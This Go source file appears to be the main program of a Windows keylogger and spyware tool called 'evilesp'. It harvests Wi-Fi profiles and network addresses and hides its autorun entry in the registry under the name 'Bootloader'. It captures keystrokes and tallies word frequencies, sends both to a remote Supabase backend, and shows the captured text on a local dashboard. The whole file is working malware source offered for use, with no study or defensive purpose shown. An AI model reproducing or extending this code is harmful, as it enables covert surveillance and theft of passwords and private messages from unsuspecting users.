package main

import (
	"encoding/json"
	evilconfig "evilesp/config"
	supabase "evilesp/supabase"
	collect_wifi "evilesp/utils"
	keylogger "evilesp/utils"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/sys/windows/registry"
)

var (
	storedKeystrokes []string
	storedWords      map[string]int // Map to store word frequencies
	keystrokeMu      sync.Mutex
)

// KeystrokeData represents received keystrokes with word tracking
type KeystrokeData struct {
	Keystroke string   `json:"keystroke"`
	Words     []string `json:"words,omitempty"`
	Timestamp int64    `json:"timestamp,omitempty"`
}

func init() {
	// Initialize word frequency map
	storedWords = make(map[string]int)
}

func main() {
	// Step 1: Get or create the device ID
	deviceID, err := evilconfig.GetOrCreateDeviceID()
	if err != nil {
		log.Fatal("Failed to get or create device ID:", err)
	}

	// Step 2: Collect WiFi data
	wifiData := collect_wifi.CollectWiFiInfo()

	collectedData := collect_wifi.CollectedData{
		DeviceIP:  collect_wifi.GetDeviceIP(),
		RouterIP:  collect_wifi.GetRouterIP(),
		DeviceMAC: collect_wifi.GetDeviceMAC(),
		RouterMAC: collect_wifi.GetRouterMAC(),
		Profiles:  wifiData,
		Timestamp: time.Now().Format(time.RFC3339),
	}

	// Step 3: Save data to JSON or send to Supabase
	saveToJSON(collectedData, "syslogs_cache.json")

	// Autorun registry entry
	addToRegistry()

	collectedDataMap := map[string]string{
		"DeviceIP":  collectedData.DeviceIP,
		"RouterIP":  collectedData.RouterIP,
		"DeviceMAC": collectedData.DeviceMAC,
		"RouterMAC": collectedData.RouterMAC,
		"Timestamp": collectedData.Timestamp,
	}

	profilesJSON, err := json.Marshal(collectedData.Profiles)
	if err != nil {
		log.Println("Failed to marshal profiles:", err)
	} else {
		collectedDataMap["Profiles"] = string(profilesJSON)
	}

	err = supabase.SendToSupabase(deviceID, "wifi", collectedDataMap)
	if err != nil {
		log.Println("Failed to send data:", err)
	} else {
		log.Println("Data sent successfully.")
	}

	// Start embedded HTTP server
	go func() {
		// Setup routes
		http.HandleFunc("/keystroke", handleKeystrokePost)
		http.HandleFunc("/api/keylog", handleKeystrokePost) // Alternative endpoint
		http.HandleFunc("/", handleDashboard)
		http.HandleFunc("/words", handleWordFrequency) // New endpoint for word frequency

		fmt.Println("ESP Keylogger server running at http://localhost:8080")
		log.Fatal(http.ListenAndServe(":8080", nil))
	}()

	// Start keylogger in a separate goroutine
	go keylogger.KeyLoggerLoop("http://localhost:8080/keystroke")

	// Keep main thread alive
	select {}
}

// Save collected data to JSON file
func saveToJSON(data collect_wifi.CollectedData, filename string) {
	file, err := os.Create(filename)
	if err != nil {
		log.Fatal("Error creating file:", err)
	}
	defer file.Close()

	err = json.NewEncoder(file).Encode(data)
	if err != nil {
		log.Fatal("Error encoding JSON data:", err)
	}
}

// Add program to Windows registry for autorun
func addToRegistry() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting executable path:", err)
		return
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println("Error opening registry:", err)
		return
	}
	defer key.Close()

	err = key.SetStringValue("Bootloader", exePath)
	if err != nil {
		fmt.Println("Error setting registry value:", err)
		return
	}

	fmt.Println("Program added to startup registry!")
}

// Handle HTTP POST requests from keylogger
func handleKeystrokePost(w http.ResponseWriter, r *http.Request) {
	// Only accept POST requests
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read request body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		log.Println("Error reading keystroke data:", err)
		return
	}
	defer r.Body.Close()

	// Parse JSON data
	var data KeystrokeData
	if err := json.Unmarshal(body, &data); err != nil {
		http.Error(w, "Error parsing JSON", http.StatusBadRequest)
		log.Println("Error parsing keystroke JSON:", err)
		return
	}

	// Store keystroke
	if data.Keystroke != "" {
		keystrokeMu.Lock()

		// Add to keystroke log
		storedKeystrokes = append(storedKeystrokes, data.Keystroke)

		// Process words if available
		if len(data.Words) > 0 {
			for _, word := range data.Words {
				// Normalize the word (lowercase and trim spaces)
				normWord := strings.ToLower(strings.TrimSpace(word))
				if normWord != "" {
					// Update word frequency
					storedWords[normWord]++
				}
			}
		}

		keystrokeMu.Unlock()

		// Log the received keystroke
		log.Printf("Received keystroke: %s", data.Keystroke)
		if len(data.Words) > 0 {
			log.Printf("Words detected: %v", data.Words)
		}

		// Also send to Supabase if configured
		deviceID, _ := evilconfig.GetOrCreateDeviceID()
		if deviceID != "" {
			keystrokeData := map[string]string{
				"keystroke": data.Keystroke,
				"timestamp": time.Now().Format(time.RFC3339),
			}

			// Add words as JSON if available
			if len(data.Words) > 0 {
				wordsJSON, _ := json.Marshal(data.Words)
				keystrokeData["words"] = string(wordsJSON)
			}

			// Send asynchronously
			go func() {
				if err := supabase.SendToSupabase(deviceID, "keystrokes", keystrokeData); err != nil {
					log.Println("Failed to send keystroke to Supabase:", err)
				}
			}()
		}
	}

	// Return success response
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, `{"status":"success"}`)
}

// Dashboard to view keystrokes
func handleDashboard(w http.ResponseWriter, r *http.Request) {
	keystrokeMu.Lock()
	defer keystrokeMu.Unlock()

	// HTML for the dashboard with auto-refresh and tabs
	fmt.Fprintf(w, `
		<!DOCTYPE html>
		<html>
		<head>
			<title>Keylogger Dashboard</title>
			<meta http-equiv="refresh" content="5">
			<style>
				body { font-family: Arial, sans-serif; margin: 20px; background-color: #f8f8f8; }
				h2 { color: #333; }
				pre { background-color: #fff; padding: 10px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
				.container { max-width: 800px; margin: 0 auto; }
				.keystroke { margin-bottom: 5px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
				.tabs { display: flex; margin-bottom: 15px; }
				.tab { padding: 10px 15px; cursor: pointer; background-color: #e0e0e0; margin-right: 5px; border-radius: 5px 5px 0 0; }
				.tab.active { background-color: #fff; font-weight: bold; box-shadow: 0 -1px 3px rgba(0,0,0,0.1); }
				.tab-content { display: none; }
				.tab-content.active { display: block; }
				.word-cloud { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
				.word { padding: 5px 10px; background-color: #e9f7fe; border-radius: 15px; margin: 3px; display: inline-block; }
				.word-freq { font-size: 0.8em; color: #666; margin-left: 5px; }
				.highlight { background-color: #fffacd; }
			</style>
			<script>
				function showTab(tabId) {
					// Hide all tabs
					document.querySelectorAll('.tab-content').forEach(tab => {
						tab.classList.remove('active');
					});
					document.querySelectorAll('.tab').forEach(tab => {
						tab.classList.remove('active');
					});
					
					// Show selected tab
					document.getElementById(tabId).classList.add('active');
					document.getElementById(tabId + '-btn').classList.add('active');
				}
				
				window.onload = function() {
					showTab('keystrokes');
				}
			</script>
		</head>
		<body>
			<div class="container">
				<h2>Keylogger Dashboard</h2>
				
				<div class="tabs">
					<div id="keystrokes-btn" class="tab active" onclick="showTab('keystrokes')">Keystrokes</div>
					<div id="words-btn" class="tab" onclick="showTab('words')">Words</div>
					<div id="info-btn" class="tab" onclick="showTab('info')">System Info</div>
				</div>
				
				<div id="keystrokes" class="tab-content active">
					<p>Total keystrokes captured: %d</p>
					<pre>`, len(storedKeystrokes))

	// Display last 100 keystrokes only to prevent page from getting too large
	startIdx := 0
	if len(storedKeystrokes) > 100 {
		startIdx = len(storedKeystrokes) - 100
	}

	for i := startIdx; i < len(storedKeystrokes); i++ {
		fmt.Fprintf(w, "<div class=\"keystroke\">%s</div>\n", storedKeystrokes[i])
	}

	fmt.Fprintf(w, `</pre>
				</div>
				
				<div id="words" class="tab-content">
					<p>Words detected (top 50 by frequency):</p>
					<div class="word-cloud">`)

	// Get top 50 words by frequency
	type wordFreq struct {
		Word  string
		Count int
	}

	var wordList []wordFreq
	for word, count := range storedWords {
		if len(word) > 2 { // Only words with at least 3 characters
			wordList = append(wordList, wordFreq{word, count})
		}
	}

	// Sort by frequency (descending)
	sort := func(i, j int) bool {
		return wordList[i].Count > wordList[j].Count
	}

	// Simple bubble sort (for small datasets)
	for i := 0; i < len(wordList); i++ {
		for j := i + 1; j < len(wordList); j++ {
			if sort(j, i) {
				wordList[i], wordList[j] = wordList[j], wordList[i]
			}
		}
	}

	// Display top 50 or less
	limit := 50
	if len(wordList) < limit {
		limit = len(wordList)
	}

	for i := 0; i < limit; i++ {
		fmt.Fprintf(w, `<span class="word">%s<span class="word-freq">×%d</span></span>`,
			wordList[i].Word, wordList[i].Count)
	}

	fmt.Fprintf(w, `</div>
				</div>
				
				<div id="info" class="tab-content">
					<p>System Information:</p>
					<pre>
Device ID: %s
Device IP: %s
Device MAC: %s
Router IP: %s
Router MAC: %s
Keylogger active since: %s
					</pre>
				</div>
			</div>
		</body>
		</html>
	`, func() string {
		id, _ := evilconfig.GetOrCreateDeviceID()
		return id
	}(),
		collect_wifi.GetDeviceIP(),
		collect_wifi.GetDeviceMAC(),
		collect_wifi.GetRouterIP(),
		collect_wifi.GetRouterMAC(),
		time.Now().Format(time.RFC3339))
}

// Handle word frequency endpoint
func handleWordFrequency(w http.ResponseWriter, r *http.Request) {
	keystrokeMu.Lock()
	defer keystrokeMu.Unlock()

	// Convert the map to a JSON response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(storedWords)
}
